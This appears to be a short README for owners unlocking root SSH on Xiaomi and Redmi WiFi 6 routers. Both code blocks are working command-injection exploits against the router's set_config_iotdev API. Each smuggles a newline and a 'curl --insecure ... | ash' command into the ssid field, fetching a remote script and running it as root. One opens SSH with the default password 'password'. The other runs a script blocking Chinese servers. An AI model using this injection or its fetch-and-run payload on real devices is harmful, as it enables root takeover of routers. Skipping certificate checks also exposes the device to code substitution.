# Unlock SSH on Xiaomi and Redmi WiFi 6 routers

Login to the Web UI (http://192.168.31.1), get the stok parameter value from the URL, replace it in the below URL and run it on browser:
```
http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0Acurl%20--insecure%20https%3A%2F%2Fraw.githubusercontent.com%2FKaMyKaSii%2FUnlock-SSH-on-Xiaomi-and-Redmi-WiFi-6-routers%2Fmaster%2Funlock_ssh.sh%20%7C%20ash%0A
```
Now you can connect to ssh with "ssh root@192.168.31.1", the default password is literally "password". Don't forget to change it with "passwd root" afterwards.

If you also want to block some Chinese servers (this will also disable access by the MiWifi app), run:
```
http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0Acurl%20--insecure%20https%3A%2F%2Fraw.githubusercontent.com%2FKaMyKaSii%2FUnlock-SSH-on-Xiaomi-and-Redmi-WiFi-6-routers%2Fmaster%2Fblock_chinese_servers.sh%20%7C%20ash%0A
```
